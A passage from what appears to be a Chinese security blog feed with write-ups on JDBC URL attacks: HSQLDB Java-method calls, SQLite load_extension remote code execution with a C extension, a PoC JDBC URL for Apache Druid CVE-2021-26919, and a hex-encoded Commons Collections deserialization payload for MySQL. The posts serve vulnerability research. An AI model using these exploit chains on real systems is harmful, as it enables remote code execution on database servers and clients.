function/procedure可直接调用Java静态方法，例如</p><ul><li>rmi 利用<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> rce(<span class="built_in">VARCHAR</span>(<span class="number">80</span>))</span><br><span class="line">    <span class="keyword">returns</span> <span class="built_in">VARCHAR</span>(<span class="number">80</span>)</span><br><span class="line">    <span class="keyword">no</span> <span class="keyword">sql</span></span><br><span class="line">    <span class="keyword">language</span> <span class="keyword">java</span></span><br><span class="line">    <span class="keyword">external</span> <span class="keyword">name</span> <span class="string">&#x27;CLASSPATH:java.rmi.Naming.list&#x27;</span></span><br><span class="line">;</span><br><span class="line"><span class="keyword">CALL</span> rce(<span class="string">&#x27;rmi://127.0.0.1:2333/a&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li>写文件<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> writeBytesToFilename(<span class="keyword">IN</span> paramString <span class="built_in">VARCHAR</span>(<span class="number">1024</span>), <span class="keyword">IN</span> paramArrayOfByte VARBINARY(<span class="number">1024</span>))</span><br><span class="line"><span class="keyword">LANGUAGE</span> <span class="keyword">JAVA</span></span><br><span class="line"><span class="keyword">DETERMINISTIC</span> <span class="keyword">NO</span> <span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> <span class="keyword">NAME</span> <span class="string">&#x27;CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;</span><br><span class="line"><span class="keyword">call</span> writeBytesToFilename(<span class="string">&#x27;/tmp/hsql111&#x27;</span>, <span class="keyword">cast</span> (<span class="string">&#x27;313131313131&#x27;</span> <span class="keyword">AS</span> VARBINARY(<span class="number">1024</span>)));</span><br></pre></td></tr></table></figure></li></ul><p>但是利用条件比较苛刻，需要</p><ol><li>可控jdbc URL</li><li>可自定义执行sql，去call java静态方法</li></ol><h3 id="2-利用反序列化"><a href="#2-利用反序列化" class="headerlink" title="2. 利用反序列化"></a>2. 利用反序列化</h3><p>赞一个浅蓝大佬的文章参考【5】，hsql研究文章挺少的，浅蓝大佬总结很到位。<br>触发点有两个</p><ol><li>JDBCResultSet，获取sql运行结果的时候，getObject触发</li><li>JDBCCallableStatement，预编译阶段，指定OTHER类型参数时可以触发</li></ol><p>浅蓝用到的demo是2，1的demo如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line">String dburl = <span class="string">&quot;jdbc:hsqldb:http://127.0.0.1/xdb&quot;</span>;</span><br><span class="line">Connection connection = DriverManager.getConnection(dburl, <span class="string">&quot;sa&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">Statement stmt = connection.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;SELECT * FROM \&quot;PUBLIC\&quot;.\&quot;MOVIES\&quot;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">rs.next();</span><br><span class="line">rs.getObject(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>可以进一步自动化成类似mysql fake server，攻击client，不过触发也是很鸡肋了</p><ol><li>可控jdbc URL</li><li>需要client execteQuery并且 getObject</li></ol><p>顺带提到下参考【7】中的CVE-2020-5902 F5 big-ip的这个漏洞，调试比较有意思的，还有宽字节遇到的这个case，参考【8】</p><h2 id="Apache-Derby"><a href="#Apache-Derby" class="headerlink" title="Apache Derby"></a>Apache Derby</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.derby<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>derby<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>10.13.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ldap 和call 应该会有问题<br>To Be Continued…</p><h2 id="SQlite"><a href="#SQlite" class="headerlink" title="SQlite"></a>SQlite</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.16.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2021/11/25新增<br>结合pyn3rd的hitb 的PPT，URL可控且SQL可控情况下，可以实现RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadExtension</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">    Connection connection = DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite::resource:http://127.0.0.1:8888/poc2.db?enable_load_extension=true&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connection.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    Statement statement = connection.createStatement();</span><br><span class="line">    statement.execute(<span class="string">&quot;SELECT load_extension(&#x27;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/sqlite-jdbc-tmp-264346288.db&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    statement.close();</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -fPIC -shared sq2.c -o sq2.dylib</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sqlite3ext.h&gt; /* Do not use &lt;sqlite3.h&gt;! */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sqlite3_extension_init</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  sqlite3 *db, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">char</span> **pzErrMsg, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> sqlite3_api_routines *pApi</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rc = SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> *argv[]=&#123;<span class="string">&quot;open&quot;</span>,<span class="string">&quot;-a&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span> *envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">  execv(<span class="string">&quot;/usr/bin/open&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节探讨了下在jdbc url可控情况下，因为内存数据库Server&amp;Client就是当前同一台机器，寻找内存数据库的利用点。思路有两点：</p><ul><li>利用数据库特性，执行系统命令/写文件，在Server上RCE</li><li>利用反序列化，构造恶意Server，在Client上RCE</li></ul><p>目前除了H2，其他还是比较困难的，未完待续。。。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://kbase.ayoma.me/databases/">Security Knowledge Base/ Databases</a></li><li>[2] <a href="https://github.com/Al1ex/CVE-2020-36179">Al1ex/CVE-2020-36179</a></li><li>[3] <a href="https://www.anquanke.com/post/id/210849">F5 BIG-IP hsqldb（CVE-2020-5902）漏洞踩坑分析</a></li><li>[4] <a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902">Proof of Concept for CVE-2020-5902</a></li><li>[5] <a href="https://xz.aliyun.com/t/9162">HSQLDB 安全测试指南（浅蓝大佬）</a></li><li>[6] <a href="http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html">Chapter 14. Properties</a></li><li>[7] <a href="https://cert.360.cn/report/detail?id=55654da3c33b4c832167a8902f14cd4f">CVE-2020-5902: F5 BIG-IP 远程代码执行漏洞分析</a></li><li>[8] <a href="https://mp.weixin.qq.com/s/yvEHxhsedSwB12PTcQ5aRg">java恶意样本调试指南</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击client思路，典型的就是mysql client，前面讲过&lt;/li&gt;
&lt;li&gt;攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里尝试探索总结下，看看能不能发现新的姿势&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;攻击内存数据库Server&quot;&gt;&lt;a href=&quot;#攻击内存数据库Server&quot; class=&quot;headerlink&quot; title=&quot;攻击内存数据库Server&quot;&gt;&lt;/a&gt;攻击内存数据库Server&lt;/h1&gt;&lt;h2 id=&quot;H2&quot;&gt;&lt;a href=&quot;#H2&quot; class=&quot;headerlink&quot; title=&quot;H2&quot;&gt;&lt;/a&gt;H2&lt;/h2&gt;&lt;p&gt;pom依赖&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.h2database&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;h2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.4.199&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="H2" scheme="http://m0d9.me/tags/H2/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
    <category term="HSQLDB" scheme="http://m0d9.me/tags/HSQLDB/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-26919 漏洞分析</title>
    <link href="http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-04-21T13:08:00.000Z</published>
    <updated>2021-04-22T07:05:40.589Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2021-26919是一个jdbc 反序列化类型漏洞，用作之前两篇jdbc mysql学习的练手，分析分析。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>已知是jdbc mysql反序列化的问题，可以直接看看官方的修复</p><p><a href="https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2">https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2</a><br><img src="/images/pasted-129.png" alt="upload successful"></p><p>具体在这个commit里<br><a href="https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678">https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678</a></p><p>代码就不贴了，主要功能是设置了jdbc:mysql &amp; jdbc:postgresql两类driver和对应的参数白名单</p><a id="more"></a><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>知道漏洞类型，剩下就是找漏洞触发点了</p><h3 id="jdbc触发点"><a href="#jdbc触发点" class="headerlink" title="jdbc触发点"></a>jdbc触发点</h3><p>最好的方式是多读官方文档，在lookup相关功能文档上找到<br><a href="https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup">https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;pollingLookup&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;pollPeriod&quot;</span>: <span class="string">&quot;PT10M&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataFetcher&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;jdbcDataFetcher&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;connectorConfig&quot;</span>: <span class="string">&quot;jdbc://mysql://localhost:3306/my_data_base&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;table&quot;</span>: <span class="string">&quot;lookup_table_name&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;keyColumn&quot;</span>: <span class="string">&quot;key_column_name&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;valueColumn&quot;</span>: <span class="string">&quot;value_column_name&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;cacheFactory&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;onHeapPolling&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关的，在web console上也找到对应的功能点</p><p><img src="/images/pasted-130.png" alt="upload successful"></p><h3 id="mysql-connector-java"><a href="#mysql-connector-java" class="headerlink" title="mysql-connector-java"></a>mysql-connector-java</h3><p><a href="https://druid.apache.org/docs/latest/development/extensions-core/lookups-cached-global.html#introspection">https://druid.apache.org/docs/latest/development/extensions-core/lookups-cached-global.html#introspection</a></p><blockquote><p>If using JDBC, you will need to add your database’s client JAR files to the extension’s directory. For Postgres, the connector JAR is already included. For MySQL, you can get it from <a href="https://dev.mysql.com/downloads/connector/j/">https://dev.mysql.com/downloads/connector/j/</a>. Copy or symlink the downloaded file to extensions/druid-lookups-cached-global under the distribution root directory.</p></blockquote><ol><li>需要将mysql-connector-java sdk拷贝至extensions/druid-lookups-cached-global</li><li>而且需要启动druid-lookups-cached-global组件，具体操作为在common.runtime.properties文件中修改druid.extensions.loadList，增加”druid-lookups-cached-global”扩展功能</li></ol><h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><p>lib目录中找到几个常见gadgets</p><ol><li><p>commons-collections</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.2.2.jar</span><br><span class="line">commons-collections4-4.2.jar</span><br></pre></td></tr></table></figure><p> 实际不可用，利用条件为cc&lt;=3.2.1 或cc4=4.0，具体可以看ysoserial</p></li><li><p>commons-beanutils</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-beanutils-1.9.4.jar</span><br></pre></td></tr></table></figure><p> 虽然ysoserial写的是1.9.2，实测1.9.4也可以利用</p></li></ol><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;maxAllowedPacket=65535&quot;</span></span><br><span class="line">user =<span class="string">&quot;cb1&quot;</span></span><br><span class="line">password=<span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure><p>需要注意的是，提交之后，需要等一两分钟之后，才会触发jdbc连接</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文简单复现了CVE-2021-26919漏洞，本以为很简单，结果还是用了大半天，踩了一些低级的坑，教训是多看文档、测试排查按最小变量来、多看程序输出日志。。。</p><p>总的来说这个漏洞利用场景比较鸡肋，需要在开启jdbc功能的前提下（sdk拷贝&amp;配置文件中的扩展开启）。官方的修复也是彻底，直接通过白名单做了限制，连postgresql也一并处理了，难道postgresql也存在利用点不成？</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://help.aliyun.com/noticelist/articleid/1060822985.html?spm=a2c4g.789213612.n2.10.7b5a6141soZJmh">【漏洞预警】Apache Druid 远程代码执行漏洞（CVE-2021-26919）</a></li><li>[2] <a href="(https://paper.seebug.org/1242/#commonscollections-2">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CVE-2021-26919是一个jdbc 反序列化类型漏洞，用作之前两篇jdbc mysql学习的练手，分析分析。&lt;/p&gt;
&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;已知是jdbc mysql反序列化的问题，可以直接看看官方的修复&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2&quot;&gt;https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/pasted-129.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;具体在这个commit里&lt;br&gt;&lt;a href=&quot;https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678&quot;&gt;https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代码就不贴了，主要功能是设置了jdbc:mysql &amp;amp; jdbc:postgresql两类driver和对应的参数白名单&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Druid" scheme="http://m0d9.me/tags/Druid/"/>
    
    <category term="Apache" scheme="http://m0d9.me/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc 碎碎念二：MySQL 反序列化</title>
    <link href="http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-04-20T08:08:00.000Z</published>
    <updated>2021-04-21T12:52:26.359Z</updated>
    
    <content type="html"><![CDATA[<p>参考【1】中四哥已经讲的很全面也很详细了，简单记录下复现过程吧</p><h2 id="MySQL-反序列化"><a href="#MySQL-反序列化" class="headerlink" title="MySQL 反序列化"></a>MySQL 反序列化</h2><h3 id="autoDeserialize"><a href="#autoDeserialize" class="headerlink" title="autoDeserialize"></a>autoDeserialize</h3><p><img src="/images/pasted-125.png" alt="upload successful"></p><p>如解释，mysql client会自动反序列化server端传回的BLOB类型</p><a id="more"></a><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="手动触发"><a href="#手动触发" class="headerlink" title="手动触发"></a>手动触发</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> test.eviltable</span><br><span class="line">(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">evil_2  <span class="built_in">blob</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> @obj=<span class="number">0xaced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test.eviltable(<span class="string">`evil_2`</span>) <span class="keyword">VALUES</span> 